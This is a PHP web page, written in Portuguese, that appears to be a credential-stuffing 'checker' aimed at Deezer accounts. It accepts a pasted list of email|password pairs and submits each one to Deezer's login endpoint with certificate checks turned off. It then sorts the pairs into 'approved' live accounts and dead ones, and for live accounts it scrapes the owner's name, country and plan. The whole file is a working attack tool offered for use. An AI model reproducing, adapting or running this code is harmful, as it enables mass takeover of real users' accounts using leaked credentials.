<?php


session_start();
error_reporting(0);
if(!isset($_SESSION['usuario']) and !isset($_SESSION['senha'])){
	echo "<script>location.href='/'</script>";
  die();
}


?>

<DOCTYPE html />

<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />

<head><title <style="width: 200px; height: 200px"> Dezzer chk FlashReverso</title> <style="width: 200px; height: 200px">

     <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
                
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.0/jquery.min.js"></script>

</head>
<body    background="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR8Xxk16FBYx56ahXUzW-doCntB9zXkPqyMAkzrPbIaA_27BPJO">

        <body onunload="alert(‘Bem vindos <3 Checker ON‘);">

    <b:if cond=’data:blog.pageType == &quot;item&quot;’>
    <div id=’subscribe’>

    </div>
    </b:if>

<center>
<br>
<br>
<font face="Candara" style="font-size: 36px; ">Deezer FlashReverso</font>
<br>
<form method="post">
<center>
<textarea rows="9" placeholder="EMAIL|SENHA" name="list" id="lista" style="margin: 0px; height: 230px; width: 675px;"></textarea> </style="width:></center>
<br/>
      <input type="submit" class="btn btn-primary" style="width: 600px;" value="Testar" name="x" </input>
       <br/><br><br>
       <font color="lime"> ✔️ APROVADAS ✔️ <br></font> <i id="accs_live" style="color:lime;">  <br></i><br><br>
<hr Width=50%>
       <br>
       <font color="red"> ⬇️ REPROVADAS ⬇️ <br></font>   <i id="accs_die" style="color:red;">  <br></i><br>
    <br>
    <br>
</form>

</center>
<?php





error_reporting(0);
                ini_set('display_errors',1);
                set_time_limit(0);


class cURL {
    var $callback = false;
    function setCallback($func_name) {
        $this->callback = $func_name;
    }
    function doRequest($method, $url, $vars) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_NOBODY, 0);
        curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_TIMEOUT, 200);
        curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
        curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
        curl_setopt($ch, CURLOPT_VERBOSE, 1);
        if ($method == 'POST') {
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $vars);
        }
        $data = curl_exec($ch);
        //echo $data;
        curl_close($ch);

        if ($data) {
            if ($this->callback) {
                $callback = $this->callback;
                $this->callback = false;
                return call_user_func($callback, $data);
            } else {
                return $data;
            }
        } else {
            return curl_error($ch);
        }
    }
    function get($url) {
        return $this->doRequest('GET', $url, 'NULL');
    }
    function post($url, $vars) {
        return $this->doRequest('POST', $url, $vars);
    }
}

function GetStr($string,$start,$end){
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}
if (isset($_POST['x'])) {
    $list = explode("\r\n", $_POST['list']);
    flush();
    foreach ($list as $value) {
        ob_implicit_flush(true);
        list($email , $senha ) = explode("|", $value);
        $email = trim($email);
        $senha = trim($senha);

$a = new cURL();
            
            //  variaveis para usar no postdata
            //   email: $email  
            //   senha: $senha
        
        $b = $a->post('https://www.deezer.com//ajax/action.php','type=login&mail='.$email.'&password='.$senha.'');

        $c = $a->get('https://www.deezer.com/us/');


    if (file_exists(getcwd().'/cookie.txt')) {
            unlink(getcwd().'/cookie.txt');
        }

    if (strpos($c, 'id=home')) { 

//          $nome = GetStr($c, 'AQUI DENTRO FICA A TAG PARA PUXAR ALGO');
        $nome = getStr($c,'FIRSTNAME',',');
        $nome2 = getStr($c,'LASTNAME',',');
        $pais = getStr($c,'COUNTRY',',');
        $plano = getStr($c,'OFFER_NAME',',');

           
            echo '<script>$("#accs_live").prepend("Lived ➜ '.$value.' | #FlashReverso<br>");</script>';

//                                      | Nome: '.$nome.' | '.$nome.'

        }else{

            echo '<script>$("#accs_die").prepend("Die ➜ '.$value.' | #FlashReverso<br>");</script>';
        }
   flush(); ob_flush();
    }
}

?>